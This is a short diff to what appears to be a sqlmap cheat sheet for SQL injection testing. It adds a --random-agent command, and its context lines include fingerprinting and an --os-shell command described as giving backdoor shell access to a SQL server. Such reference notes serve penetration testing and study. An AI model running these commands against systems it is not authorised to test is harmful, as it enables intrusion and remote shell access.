@@ -6,6 +6,9 @@
 # Parse request data and test | request data can be obtained with burp
 ./sqlmap.py -u <request-file> <options>
 
+# Use random agent 
+./sqlmap.py -u <request-file> --random-agent
+
 # Fingerprint | much more information than banner
 ./sqlmap.py -u <request-file> --fingerprint
 
@@ -48,5 +51,3 @@
 
 # Get backdoor access to sql server | can give shell access
 ./sqlmap.py -u <request-file> --os-shell
-
-#
